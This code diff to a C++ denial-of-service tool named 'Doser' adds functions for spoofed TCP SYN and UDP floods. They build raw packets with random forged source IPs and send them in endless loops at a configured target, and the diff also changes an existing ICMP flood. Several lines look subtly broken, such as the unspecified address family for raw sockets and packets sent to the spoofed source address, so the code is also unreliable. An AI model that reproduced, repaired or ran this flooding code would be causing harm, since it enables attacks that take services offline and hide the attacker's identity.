@@ -11,6 +11,7 @@
 #include <netinet/ip.h>
 #include <netinet/ip_icmp.h>
 #include "Doser.h"
+#include "headers.h"
 
 
 void Doser::attack(const int *id){
@@ -357,7 +358,7 @@ void Doser::icmp_flood(const int *id) {
     while(true){
         for(x = 0;x < conf->CONNECTIONS; x++){
             bzero(buf, sizeof(buf));
-            if((s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0){
+            if((s = socket(AF_UNSPEC, SOCK_RAW, IPPROTO_RAW)) < 0){
                 logger->Log("socket() error", Logger::Error);
                 exit(EXIT_FAILURE);
             }
@@ -392,7 +393,7 @@ void Doser::icmp_flood(const int *id) {
             ip->ip_sum = 0;
 
             dst.sin_addr = ip->ip_dst;
-            dst.sin_family = AF_INET;
+            dst.sin_family = AF_UNSPEC;
             icmp->type = ICMP_ECHO;
             icmp->code = 0;
             icmp->checksum = htons(~(ICMP_ECHO << 8));
@@ -406,6 +407,7 @@ void Doser::icmp_flood(const int *id) {
 
                 if(sendto(s, buf, sizeof(buf), 0, (struct sockaddr *)&dst, sizeof(dst)) < 0){
                     logger->Log("sendto() error", Logger::Error);
+                    exit(EXIT_FAILURE);
                 }
 
                 if(offset == 0){
@@ -423,24 +425,6 @@ void Doser::icmp_flood(const int *id) {
 
 }
 
-unsigned short Doser::cksum(unsigned short *ptr, int nbytes) {
-    long checksum;
-    u_short oddbyte;
-    checksum = 0;
-    while (nbytes > 1) {
-        checksum += *ptr++;
-        nbytes -= 2;
-    }
-    if (nbytes == 1) {
-        oddbyte = 0;
-        *((u_char *) & oddbyte) = *(u_char *) ptr;
-        checksum += oddbyte;
-    }
-    checksum = (checksum >> 16) + (checksum & 0xffff);
-    checksum += (checksum >> 16);
-    return (static_cast<u_short>(~checksum));
-}
-
 const char *Doser::randomizeIP() {
     std::string src{std::to_string(randomInt(1, 256))};
     src += "."
@@ -450,4 +434,183 @@ const char *Doser::randomizeIP() {
            + "."
            + std::to_string(randomInt(1, 256));
     return src.c_str();
+}
+
+void Doser::spoofed_tcp_flood(const int *id) {
+    int s, on = 1, x;
+    std::string message{};
+    char buffer[8192];
+    while (true){
+        for(x = 0; x < conf->CONNECTIONS; x++){
+            auto s_addr = randomizeIP();
+            auto s_port = randomInt(0, 65535);
+            bzero(buffer, sizeof(buffer));
+            auto *ip = (struct ipheader *) buffer;
+
+            auto *tcp = (struct tcpheader *) (buffer + sizeof(struct ipheader));
+
+            struct sockaddr_in sin{}, din{};
+
+            if((s = socket(AF_UNSPEC, SOCK_RAW, IPPROTO_TCP)) < 0){
+                logger->Log("socket() error", Logger::Error);
+                exit(EXIT_FAILURE);
+            }
+
+            sin.sin_family = AF_UNSPEC;
+
+            din.sin_family = AF_UNSPEC;
+            sin.sin_port = htons(s_port);
+
+            din.sin_port = htons(strtol(conf->port.c_str(), nullptr, 10));
+
+
+            sin.sin_addr.s_addr = inet_addr(s_addr);
+
+            din.sin_addr.s_addr = inet_addr(conf->website.c_str());
+
+            ip->iph_ihl = 5;
+
+            ip->iph_ver = 4;
+
+            ip->iph_tos = 16;
+
+            ip->iph_len = sizeof(struct ipheader) + sizeof(struct tcpheader);
+
+            ip->iph_ident = htons(54321);
+
+            ip->iph_offset = 0;
+
+            ip->iph_ttl = 64;
+
+            ip->iph_protocol = 6; // TCP
+
+            ip->iph_chksum = 0; // Done by kernel
+
+            ip->iph_sourceip = inet_addr(s_addr);
+
+
+            ip->iph_destip = inet_addr(conf->website.c_str());
+            tcp->tcph_srcport = htons(s_port);
+
+            tcp->tcph_destport = htons(strtol(conf->port.c_str(), nullptr, 10));
+
+            tcp->tcph_seqnum = htonl(1);
+
+            tcp->tcph_acknum = 0;
+
+            tcp->tcph_offset = 5;
+
+            tcp->tcph_syn = 1;
+
+            tcp->tcph_ack = 0;
+
+            tcp->tcph_win = htons(32767);
+
+            tcp->tcph_chksum = 0; // Done by kernel
+
+            tcp->tcph_urgptr = 0;
+            ip->iph_chksum = checksum((unsigned short *) buffer, (sizeof(struct ipheader) + sizeof(struct tcpheader)));
+            // Inform the kernel do not fill up the headers' structure, we fabricated our own
+            if(setsockopt(s, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on)) < 0){
+                logger->Log("setsockopt() error", Logger::Error);
+                exit(EXIT_FAILURE);
+            }
+
+            if(sendto(s, buffer, ip->iph_len, 0, (struct sockaddr *)&sin, sizeof(sin)) < 0){
+                logger->Log("sendto() error", Logger::Error);
+                exit(EXIT_FAILURE);
+            }
+            message = std::to_string(*id) + ": Voly Sent";
+            logger->Log(&message, Logger::Info);
+            close(s);
+            usleep(30000);
+        }
+    }
+
+}
+
+void Doser::spoofed_udp_flood(const int *id) {
+    int s, on = 1, x;
+    std::string message{};
+    char buffer[8192];
+    while (true){
+        for(x = 0; x < conf->CONNECTIONS; x++){
+            auto s_addr = randomizeIP();
+            auto s_port = randomInt(0, 65535);
+            bzero(buffer, sizeof(buffer));
+            auto *ip = (struct ipheader *) buffer;
+
+            auto *udp = (struct udpheader *) (buffer + sizeof(struct ipheader));
+
+            struct sockaddr_in sin{}, din{};
+
+            if((s = socket(AF_UNSPEC, SOCK_RAW, IPPROTO_TCP)) < 0){
+                logger->Log("socket() error", Logger::Error);
+                exit(EXIT_FAILURE);
+            }
+
+            sin.sin_family = AF_UNSPEC;
+
+            din.sin_family = AF_UNSPEC;
+            sin.sin_port = htons(s_port);
+
+            din.sin_port = htons(strtol(conf->port.c_str(), nullptr, 10));
+
+            // Source IP, can be any, modify as needed
+
+            sin.sin_addr.s_addr = inet_addr(s_addr);
+
+            din.sin_addr.s_addr = inet_addr(conf->website.c_str());
+
+            ip->iph_ihl = 5;
+
+            ip->iph_ver = 4;
+
+            ip->iph_tos = 16; // Low delay
+
+            ip->iph_len = sizeof(struct ipheader) + sizeof(struct udpheader);
+
+            ip->iph_ident = htons(54321);
+
+            ip->iph_ttl = 64; // hops
+
+            ip->iph_protocol = 17; // UDP
+
+
+            ip->iph_sourceip = inet_addr(s_addr);
+
+            // The destination IP address
+
+            ip->iph_destip = inet_addr(conf->website.c_str());
+
+
+            udp->udph_srcport = htons(s_port);
+
+            // Destination port number
+
+            udp->udph_destport = htons(*(unsigned short *)conf->port.c_str());
+
+            udp->udph_len = htons(sizeof(struct udpheader));
+
+            // Calculate the checksum for integrity
+
+            ip->iph_chksum = checksum((unsigned short *)buffer, sizeof(struct ipheader) + sizeof(struct udpheader));
+
+            // Inform the kernel do not fill up the packet structure. we will build our own...
+
+            if(setsockopt(s, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on)) < 0){
+                logger->Log("setsockopt() error", Logger::Error);
+                exit(EXIT_FAILURE);
+            }
+
+            if(sendto(s, buffer, ip->iph_len, 0, (struct sockaddr *)&sin, sizeof(sin)) < 0){
+                logger->Log("sendto() error", Logger::Error);
+                exit(EXIT_FAILURE);
+            }
+            message = std::to_string(*id) + ": Voly Sent";
+            logger->Log(&message, Logger::Info);
+            close(s);
+            usleep(30000);
+        }
+    }
 }
